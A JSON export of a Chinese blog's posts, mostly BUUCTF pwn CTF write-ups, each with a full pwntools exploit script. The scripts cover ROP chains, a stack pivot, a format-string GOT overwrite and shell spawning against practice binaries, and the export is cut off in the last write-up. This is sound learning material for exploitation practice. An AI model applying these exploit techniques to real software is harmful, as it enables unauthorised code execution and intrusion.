[{"categories":null,"contents":"本栏目用于收集各种杂项随笔\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/posts/hello/","section":"posts","summary":"本栏目用于收集各种杂项随笔","tags":null,"title":"Hello"},{"categories":["writeup"],"contents":"原题链接\nchecksec ida 解题思路很简单，先后调用win_function1、winfunction2、flag函数即可，重要的是rop链的顺序，32位系统比较杂乱\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./PicoCTF_2018_rop_chain\u0026#34; libc_name: str = \u0026#34;/home/ctf/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;28219\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def sendline_after_clean(content: bytes) -\u0026gt; None: p.clean() p.sendline(content) def interactive_after_clean() -\u0026gt; None: p.clean() p.interactive() #需要自行设定offset offset:int = 0x18 + 0x4 payload = flat([ m_elf.sym[\u0026#39;win_function1\u0026#39;], m_elf.sym[\u0026#39;win_function2\u0026#39;], m_elf.sym[\u0026#39;flag\u0026#39;], -1163220307, -559039827 ]) payload = flat({offset : payload}) sendline_after_clean(payload) interactive_after_clean() 调用win1，因为没有参数，所以不用安排栈 等到win1结束时，有一条ret指令，会将win2弹入EIP\n而win2是一个有参数的函数，为了获取栈中参数，32位系统的方法是，使用[ebp+8]作为第一个参数，而ebp的值如下图所示：\n所以参数和指令之间要隔开\nflag函数同理\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/","section":"writeup","summary":"原题链接 checksec ida 解题思路很简单，先后调用win_function1、winfunction2、flag函数即可，重要的是rop链的顺序，32位系统比较杂乱","tags":["pwn","32位系统传参"],"title":"【32位系统传参】BUUCTF picoctf_2018_rop chain"},{"categories":["writeup"],"contents":"原题链接\n查看程序架构 ida伪代码 典型的C++语法，这里应该有两个类，Admin继承自User： 其中我们发现Admin::shell正是我们需要的后门函数： 那么我们只要想办法调用这个函数即可 整个程序有两个输入点： 只要密码正确，程序就会调用v8指向的函数 而v8又是什么呢？v8的值是v3的指针，这里就有一个致命漏洞，v2是一个栈指针而不是.bss节的指针。所以如果返回main函数后再调用其他函数，就可能把这个地址覆盖掉 我们看看汇编代码这个栈指针在哪里 看来这个v2在[rbp+var_18]处，而这个值，我们在read_password中是可以覆盖的 这样我们就可以将其覆盖为Admin::shell了\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./login\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25767\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... backdoor = 0x400E88 sendline_after_clean(\u0026#34;admin\u0026#34;) payload = flat([ \u0026#34;2jctf_pa5sw0rd\u0026#34;.ljust(0x60-0x18, \u0026#34;\\x00\u0026#34;), backdoor ]) sendline_after_clean(payload) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/c++pwnzjctf-2019login/","section":"writeup","summary":"原题链接 查看程序架构 ida伪代码 典型的C++语法，这里应该有两个类，Admin继承自User： 其中我们发现Admin::shell正是我们需要的后门函","tags":["pwn","C++Pwn"],"title":"【C++Pwn】[ZJCTF 2019]Login"},{"categories":["writeup"],"contents":"原题链接\n查看程序架构 ida伪代码 限制溢出的字符到ret只能有一个地址，没有后门函数，典型栈迁移\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./ciscn_s_4\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25030\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x28 backdoor = m_elf.sym[\u0026#39;hack\u0026#39;] payload = b\u0026#34;a\u0026#34;*0x27 + b\u0026#34;b\u0026#34; send_after_clean(payload, no_show=True) buf = recv_and_transform(\u0026#34;b\u0026#34;) - 0x38 leave_ret = 0x08048562 call_system = 0x8048559 payload = flat([ 0, call_system, buf + 4*3, \u0026#34;/bin/sh\\x00\u0026#34; ]).ljust(0x28, b\u0026#34;\\x00\u0026#34;) payload += flat([ buf, leave_ret ]) sendline_after_clean(payload, no_show=True) interactive_after_clean(no_show=True) 其中，因为call会自动将下一条指令入栈，所以就不用在栈中空出一位给ret了，buf+4*3的位置会被调整为esp+8\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/call32%E6%A0%88%E8%BF%81%E7%A7%BBbuuctf-ciscn_2019_s_4/","section":"writeup","summary":"原题链接 查看程序架构 ida伪代码 限制溢出的字符到ret只能有一个地址，没有后门函数，典型栈迁移 exp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool","tags":["pwn","32位系统call","栈迁移"],"title":"【call32】【栈迁移】BUUCTF ciscn_2019_s_4"},{"categories":["writeup"],"contents":"【Write-up】BUUCTF others_shellcode 原题链接\n【Write-up】BUUCTF others_shellcode checksec 查看程序架构 ida 查看程序伪代码 构建 exp checksec 查看程序架构 $ checksec --file shell_asm [*] \u0026#39;/home/peterl/security/workspace/shell_asm/shell_asm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled ida 查看程序伪代码 然后我们看到它的getShell函数：\n我们看到它里面有一句很奇怪的__asm { int 80h; LINUX - sys_execve }，这是干什么的？\n我们按 tab 看一下它对应的汇编代码：\n这里我们已经看出一点端倪了，没错，这一句就是内联汇编（内联汇编使用“__asm”（C++）和“asm”（C 和 C++）关键字声明）\n具体可以看以下推文：\nMIPS 指令集：内嵌汇编 asm 语法介绍 C 语言内嵌汇编**asm__**volatile__ C 语言 ASM 汇编内嵌语法 至于int 80的作用，请参考我写的这篇 writeup的第二个 exp\n构建 exp 这题根本不需要 exp，直接nc 网址 端口号即可，程序会自动执行execve(\u0026quot;/bin/sh\u0026quot;, 0, 0)\n这题的主要功能就是介绍int 80的作用还有内联汇编\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/","section":"writeup","summary":"【Write-up】BUUCTF others_shellcode 原题链接 【Write-up】BUUCTF others_shellcode checksec 查看程序架构 ida 查看程序伪代码 构建 exp checksec 查看程序架构 $ checksec --file shell_asm [*] \u0026#39;/home/peterl/security/workspace/shell_asm/shell_asm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack:","tags":["pwn","C内嵌汇编"],"title":"【C内嵌汇编】others_shellcode"},{"categories":["writeup"],"contents":"查看程序架构 ida伪代码 典型的格式化字符串漏洞，我们gdb到printf(format);那里看下栈： 可以看到格式化字符串在栈上储存要先吞掉一个字符才到第8个参数的位置 我们也可以看到在第0x97个参数的位置存储了__libc_start_main+247的值，我们可以用其计算出libc的基址 那么答案就很简单了，改写printf的got值为system即可\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./axb_2019_fmt32\u0026#34; libc_name:str = \u0026#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;25269\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... format_payload = b\u0026#34;%151$p\u0026#34; sendline_after_clean(format_payload) libcbase = recv_and_transform(\u0026#34;:\u0026#34;, False, False, \u0026#34;\\n\u0026#34;) - 247 - libc.sym[\u0026#39;__libc_start_main\u0026#39;] system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] binsh_addr = libcbase + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) one_gadget = libcbase + 0x3a80e suclog( libcbase=libcbase, system_addr=system_addr, binsh_addr=binsh_addr ) format_payload = b\u0026#34;a\u0026#34; + fmtstr_payload(8, {m_elf.got[\u0026#39;printf\u0026#39;]:one_gadget}, 10) sendline_after_clean(format_payload, no_show=False) sendline_after_clean(b\u0026#34;/bin/sh\u0026#34;) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/fmtstr_payload%E5%87%BD%E6%95%B0buuctf-axb_2019_fmt32/","section":"writeup","summary":"查看程序架构 ida伪代码 典型的格式化字符串漏洞，我们gdb到printf(format);那里看下栈： 可以看到格式化字符串在栈上储存要先吞掉一个字符才","tags":["pwn","fmtstr_payload函数","格式化字符串"],"title":"【fmtstr_payload函数】BUUCTF axb_2019_fmt32"},{"categories":["writeup"],"contents":"【Write-up】BUUCTF 【HarekazeCTF2019】baby_rop 原题链接\n【Write-up】BUUCTF 【HarekazeCTF2019】baby_rop checksec 查看程序架构 ida 查看程序伪代码 gdb 调试 构建 exp 完整 exp checksec 查看程序架构 $ checksec --file babyrop [*] \u0026#39;/home/peterl/security/workspace/babyrop/babyrop\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64 位程序，不能使用 shellcode\nida 查看程序伪代码 有 scanf，有 printf，看起来可能是普通的栈溢出，我们可以调试看看\n此题用不了格式化字符串漏洞，因为我们控制不了 format 字符串，只能控制后面跟的 args，而 printf 只会对 format 字符串作解析\ngdb 调试 这题比较坑的是第一条输出语句是system函数输出的，因此我们在 gdb 调试之前就要加一句set follow-fork-mode parent，这条命令将调试追踪固定在父程序上，不让他跑去追踪子程序\n我们通过 ida 找到call _printf的地址，使用b* 0x40060F打个断点，这时候如果直接 run 就需要输入了，所以我们先cyclic 50一个规律字符串用以输入\npwndbg\u0026gt; cyclic 50 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama 然后直接r\n然后我们看到栈情况是这样的：\n00:0000│ rsi rsp 0x7fffffffd770 ◂— \u0026#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 01:0008│ 0x7fffffffd778 ◂— \u0026#39;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 02:0010│ rbp 0x7fffffffd780 ◂— \u0026#39;eaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 03:0018│ 0x7fffffffd788 ◂— \u0026#39;gaaahaaaiaaajaaakaaalaaama\u0026#39; 04:0020│ 0x7fffffffd790 ◂— \u0026#39;iaaajaaakaaalaaama\u0026#39; 05:0028│ 0x7fffffffd798 ◂— \u0026#39;kaaalaaama\u0026#39; 06:0030│ 0x7fffffffd7a0 ◂— 0x1ff00616d /* \u0026#39;ma\u0026#39; */ 作者此时心中一喜，连按n继续到ret指令，看一看此时rsp栈顶指针指向哪里\n我们发现 return 值可以被我们栈溢出掉，于是我们可以用cyclic -l gaaa来看一看偏移量是多少：\npwndbg\u0026gt; cyclic -l gaaa 24 同时当前程序 plt 表中肯定有system（前面调用过），我们只需要/bin/sh或者sh就能构建 exp 了！\n构建 exp 在 ida 中找到system的地址：\nROPgadget寻找/bin/sh：\n$ ROPgadget --binary babyrop --string \u0026#34;/bin/sh\u0026#34; Strings information ============================================================ 0x0000000000601048 : /bin/sh ROPgadget寻找pop rdi;ret和ret：\n$ ROPgadget --binary babyrop --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ ... 0x0000000000400683 : pop rdi ; ret ... 0x0000000000400479 : ret ... 那么我们的 payload 就出来了：\npop_rdi:int = 0x400683 ret: int = 0x400479 sys:int = 0x400490 bin_sh: int = 0x601048 payload = b\u0026#34;aaaabaaacaaadaaaeaaafaaa\u0026#34; + pg(ret) + pg(pop_rdi) + pg(bin_sh) + pg(sys) 完整 exp from pwn import * from pwn import p64, p32, u32, u64 import pwnlib # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./babyrop\u0026#34; libc_name: str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;28069\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x40060F\u0026#34;) else: p = process(fn, env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;}) pop_rdi:int = 0x400683 ret: int = 0x400479 sys:int = 0x400490 bin_sh: int = 0x601048 p.recvuntil(\u0026#34;What\u0026#39;s your name? \u0026#34;) payload = b\u0026#34;aaaabaaacaaadaaaeaaafaaa\u0026#34; + pg(ret) + pg(pop_rdi) + pg(bin_sh) + pg(sys) p.sendline(payload) # p.recvuntil(\u0026#34;!\\n\u0026#34;) p.interactive() 此题还有一个比较坑的点，它的 flag 并不是放在当前目录下，此题 flag 的位置在/home/babyrop内，可以通过find -name flag查找位置（动作快一点，有时间限制）\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/harekazectf2019baby_rop/","section":"writeup","summary":"【Write-up】BUUCTF 【HarekazeCTF2019】baby_rop 原题链接 【Write-up】BUUCTF 【HarekazeCTF20","tags":["pwn"],"title":"【HarekazeCTF2019】baby_rop"},{"categories":["writeup"],"contents":"【Write-up】BUUCTF ciscn_2019_en_2 原题链接和这道题是一道题，一模一样的\n【Write-up】BUUCTF ciscn_2019_en_2 checksec 查看程序架构 ida 查看程序伪代码 构建 exp 完整 exp checksec 查看程序架构 $ checksec --file ciscn_2019_en_2 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_en_2/ciscn_2019_en_2\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64 位程序，不能用 shellcode\n再用readelf命令看一下：\n$ readelf -r ciscn_2019_en_2 重定位节 \u0026#39;.rela.dyn\u0026#39; at offset 0x538 contains 4 entries: 偏移量 信息 类型 符号值 符号名称 + 加数 000000601ff8 000800000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 000000602080 000d00000005 R_X86_64_COPY 0000000000602080 stdout@GLIBC_2.2.5 + 0 000000602090 000e00000005 R_X86_64_COPY 0000000000602090 stdin@GLIBC_2.2.5 + 0 0000006020a0 000f00000005 